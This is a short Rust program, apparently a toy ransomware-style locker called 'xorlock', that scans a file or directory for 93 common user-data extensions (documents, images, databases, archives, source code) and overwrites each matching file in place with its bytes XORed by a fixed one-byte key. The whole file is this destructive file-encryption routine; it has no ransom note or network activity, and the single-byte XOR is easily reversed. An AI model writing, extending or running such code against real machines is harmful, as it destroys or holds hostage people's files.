#![allow(non_snake_case)]
#![allow(unused)]


use std::path::Path;
use std::ffi::OsStr;
use std::fs;
use std::fs::File;
use std::io::prelude::*;

//
// List of Extensions
//
const EXT: [&str; 93] = [  
                            "jpg", "jpeg", "bmp",    "gif",  "png",  "svg",   "psd",    "raw",  "mp3",   "mp4",
                            "m4a", "aac",  "ogg",    "flac", "wav",  "wma",   "aiff",   "ape",  "avi",   "flv",
                            "m4v", "mkv",  "mov",    "mpg",  "mpeg", "wmv",   "swf",    "3gp",  "doc",   "docx",
                            "xls", "xlsx", "ppt",    "pptx", "odt",  "odp",   "ods",    "txt",  "rtf",   "tex",
                            "pdf", "epub", "md",     "yml",  "yaml", "json",  "xml",    "csv",  "db",    "sql",
                            "dbf", "mdb",  "iso",    "html", "htm",  "xhtml", "php",    "asp",  "aspx",  "rs", 
                            "jsp", "css",  "c",      "cpp",  "cxx",  "h",     "hpp",    "hxx",  "java",  "class",  
                            "jar", "bat",  "vb",     "awk",  "sh",   "cgi",   "pl",     "ada",  "swift", "go",  
                            "pyc", "bf",   "coffee", "zip",  "tar",  "tgz",   "bz2",    "7z",   "rar",   "js", 
                            "bak", "ps",   "py"
                        ];


    fn main() {

        let path = "/home/ubuntu/xorlock/test.txt".to_string(); // Path of Wanted file or directory (modify path as needed)
        let key: u8 = 255; 
        crypter(path, key);
        
    }

    fn crypter(path: String, key: u8) {

        let path = Path::new(&path);
        
        //
        // Checking whether the passed parameter is directory or file
        // 
        if path.is_dir() == true { // Directory

            let path = std::fs::read_dir(&path).unwrap();

                for files in path {

                    let mut files = files.unwrap().path().display().to_string();
                    let files = Path::new(&files);

                    let get_ext = extension(files);
                    checkmate(files, key, get_ext);
                
                }
        
        } else { // File
            
            // Check passed file/Directory exists or not 
            match fs::metadata(path) { 
                Ok(_) => {
                            let get_ext = extension(path); 
                            checkmate(path, key, get_ext);
                         },
                Err(_) => println!("[*] File/Directory doesn't exist !!!\n[*] Ensure that you have chosen the correct path..."),
            }
        }
    

    }

    //
    // Getting the extension of a given file
    // 
    fn extension(filename: &Path) -> Option<&str> {
        let get_ext = Path::new(filename)        
                            .extension()        
                            .and_then(OsStr::to_str);
        get_ext
    }

    //
    // XoRing the data present in file
    //
    fn encrypt(path: &Path, key: u8) {
        let mut file = File::open(path).expect("Cannot open the file");

        let mut file_content = Vec::new();
        file.read_to_end(&mut file_content).unwrap();

        for bytes in &mut file_content {
            *bytes ^= key;
        } 

        let mut file = File::create(path).expect("Cannot create a file");
        file.write_all(&file_content).unwrap();

    }

    //
    // Check the file extension from the list of constant then encrypt the data
    //
    fn checkmate(path: &Path, key: u8, get_ext: Option<&str>) {
        for elements in EXT.iter() {
            let elements: &str = elements;
            if get_ext == Some(elements) {
                encrypt(path, key);
            }
        }
    }